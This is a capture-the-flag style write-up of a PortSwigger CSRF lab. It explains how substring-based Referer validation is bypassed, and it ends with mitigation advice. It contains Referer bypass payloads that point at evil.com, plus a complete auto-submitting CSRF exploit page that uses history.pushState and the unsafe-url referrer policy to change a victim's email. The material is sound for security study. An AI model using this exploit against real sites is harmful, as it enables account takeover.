# Lab12 - CSRF With Broken Referer Validation

## Objective

Exploit a CSRF vulnerability where the application attempts to validate the Referer header but performs weak string matching instead of validating the actual hostname.

The goal is to change the victim's email address using a crafted CSRF exploit.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | CSRF |
| Difficulty | Practitioner |
| Vulnerability | Weak Referer Validation |
| Bypass Technique | Referer Manipulation |
| Platform | PortSwigger Web Security Academy |

---

# Lab Description

The application uses the Referer header as a CSRF defense.

However, instead of validating the actual hostname, it simply checks whether its own domain appears somewhere inside the Referer string.

Because of this, attackers can construct Referer values that contain the target domain while still originating from attacker-controlled websites.

---

# Core Concept

## Intended Validation

The server should validate:

```text
Actual Hostname
```

Example:

```http
Referer:
https://YOUR-LAB-ID.web-security-academy.net/my-account
```

---

## Vulnerable Validation

Server performs:

```php
strpos(
$referer,
"YOUR-LAB-ID.web-security-academy.net"
)
```

instead of:

```php
parse_url(
$referer,
PHP_URL_HOST
)
```

---

## Result

The following becomes valid:

```http
Referer:
https://evil.com?YOUR-LAB-ID.web-security-academy.net
```

even though:

```text
Actual Host = evil.com
```

---

# Attack Flow

```text
Victim Visits Exploit Page
        ↓
Exploit URL Contains Target Domain
        ↓
Browser Sends Referer
        ↓
Server Finds Expected String
        ↓
Validation Passed
        ↓
CSRF Executed
        ↓
Email Changed
```

---

# Vulnerability Analysis

## Step 1 - Capture Sensitive Request

Intercept:

```http
POST /my-account/change-email HTTP/2

email=test@test.com
```

---

## Step 2 - Verify Referer Protection

Original:

```http
Referer:
https://YOUR-LAB-ID.web-security-academy.net/my-account
```

Result:

```text
Accepted
```

---

## Step 3 - Test Invalid Referer

Replace:

```http
Referer:
https://evil.com
```

Result:

```text
Rejected
```

Observation:

```text
Referer Validation Exists
```

---

## Step 4 - Test Bypass Referer

Replace:

```http
Referer:
https://evil.com?YOUR-LAB-ID.web-security-academy.net
```

Result:

```text
Accepted
```

Observation:

```text
Server Performs
Substring Matching
```

instead of hostname validation.

---

# Attack Methodology

```text
Capture Request
        ↓
Verify Referer Validation
        ↓
Identify Weak Matching
        ↓
Generate CSRF PoC
        ↓
Manipulate Referer
        ↓
Force Browser To Send Full URL
        ↓
Deliver Exploit
```

---

# Exploitation Steps

### Step 1

Generate CSRF PoC using Burp.

---

### Step 2

Add hidden email field.

---

### Step 3

Manipulate browser URL using:

```javascript
history.pushState()
```

---

### Step 4

Force browser to include full URL inside Referer.

---

### Step 5

Submit form automatically.

---

### Step 6

Deliver exploit.

---

# Full Payload(s) Used

## Payload 1 - Invalid Referer Test

```http
Referer:
https://evil.com
```

---

### Result

```text
Rejected
```

---

## Payload 2 - Query String Injection

```http
Referer:
https://evil.com?YOUR-LAB-ID.web-security-academy.net
```

---

### Result

```text
Accepted
```

---

### Observation

Application only checks:

```text
Contains Target Domain
```

---

## Additional Validation Payloads

### Payload A

```http
Referer:
https://target.com.evil.com
```

---

### Payload B

```http
Referer:
https://evil.com/path/target.com
```

---

### Payload C

```http
Referer:
https://evil.com/#target.com
```

---

These payloads are useful during real-world testing to confirm weak Referer validation.

---

## Initial CSRF PoC

```html
<html>
<body>

<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"
      method="POST">

<input type="hidden"
       name="email"
       value="attacker@evil.com">

</form>

<script>
document.forms[0].submit();
</script>

</body>
</html>
```

---

### Problem

Modern browsers often remove:

```text
Query Strings
```

from Referer headers.

Result:

```http
Referer:
https://exploit-server.net/
```

Target domain disappears.

Attack fails.

---

## Final Working Payload

```html
<html>

<head>
<meta name="referrer"
      content="unsafe-url">
</head>

<body>

<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"
      method="POST">

<input type="hidden"
       name="email"
       value="attacker@evil.com">

</form>

<script>

history.pushState(
    "",
    "",
    "/?YOUR-LAB-ID.web-security-academy.net"
);

document.forms[0].submit();

</script>

</body>

</html>
```

---

# Why The Payload Works

## Step 1

Victim loads exploit page.

---

## Step 2

Browser executes:

```javascript
history.pushState()
```

Current URL becomes:

```text
https://exploit-server.net/?YOUR-LAB-ID.web-security-academy.net
```

---

## Step 3

Browser submits CSRF form.

---

## Step 4

Because of:

```html
<meta name="referrer"
      content="unsafe-url">
```

browser includes full URL.

---

## Step 5

Resulting Referer:

```http
Referer:
https://exploit-server.net/?YOUR-LAB-ID.web-security-academy.net
```

---

## Step 6

Application checks:

```text
Contains Lab Domain?
```

---

## Step 7

Check succeeds.

---

## Step 8

Request accepted.

Email changed.

---

# Personal Analysis & Testing Process

## Initial Assumption

Lab description suggested:

```text
Broken Referer Validation
```

instead of missing Referer validation.

---

## First Test

Changed Referer:

```http
https://evil.com
```

---

### Result

```text
Rejected
```

Confirmed validation exists.

---

## Second Test

Used:

```http
https://evil.com?YOUR-LAB-ID.web-security-academy.net
```

---

### Result

```text
Accepted
```

This immediately suggested:

```text
String Matching
```

instead of:

```text
Hostname Validation
```

---

## New Challenge

Burp Repeater worked.

Browser exploit failed.

---

## Investigation

Observed:

```text
Browser Strips Query String
```

from Referer.

---

## Breakthrough

Found:

```html
<meta name="referrer"
      content="unsafe-url">
```

which preserves the complete URL.

---

## Final Verification

Exploit page generated:

```http
Referer:
https://exploit-server.net/?YOUR-LAB-ID.web-security-academy.net
```

Validation passed.

Lab solved.

---

## Important Revision Note

Lab11 and Lab12 are often confused.

### Lab11

```text
Referer Missing
        ↓
Request Accepted
```

---

### Lab12

```text
Referer Present
        ↓
Weak Validation
        ↓
Request Accepted
```

Different vulnerabilities.

---

# Tools Used

```text
Burp Proxy
Burp Repeater
Burp CSRF PoC Generator
Exploit Server
```

---

# Mitigation

## Incorrect Validation

```php
strpos(
$referer,
"target.com"
)
```

---

## Correct Validation

```php
$host =
parse_url(
$referer,
PHP_URL_HOST
);

if(
$host === "target.com"
)
{
    allow_request();
}
```

---

## Use CSRF Tokens

Primary defense should always be:

```text
CSRF Tokens
```

---

## Validate Origin Header

Use:

```http
Origin:
```

as an additional protection layer.

---

# Related Theory

- `17-what-is-the-referer-header.md`
- `19-validation-of-referer-can-be-circumvented.md`

---

# Related Payloads

- `referer-bypass-techniques.md`
- `csrf-referer-cheatsheet.md`

---

# Key Learnings

- String matching is not secure validation.
- Hostname validation is required.
- Modern browser Referer behavior can impact exploit reliability.
- `unsafe-url` can be used to preserve the full Referer value.
- Referer validation should never replace CSRF tokens.

> If a security control can be bypassed by placing the expected value somewhere inside a string, it is not performing proper validation.